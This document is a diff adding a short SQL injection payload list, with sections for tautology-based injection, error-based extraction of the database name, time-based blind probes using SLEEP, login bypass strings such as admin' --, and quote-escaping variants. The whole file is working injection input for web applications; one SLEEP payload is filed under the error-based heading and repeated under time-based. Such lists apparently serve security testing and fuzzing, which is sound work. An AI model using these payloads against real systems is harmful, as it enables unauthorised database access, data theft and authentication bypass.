@@ -1,0 +1,21 @@
+# Basic SQLi
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+# Error-based
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT(COUNT(*),CONCAT(0x7e,0x7e,DATABASE(),0x7e,0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--
+# Time-based (Blind)
+' AND SLEEP(5)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+# Auth Bypass
+admin' --
+admin' #
+admin'/*
+' or 1=1 limit 1 --
+# String escaping
+\') OR 1=1--
+\")) OR 1=1--
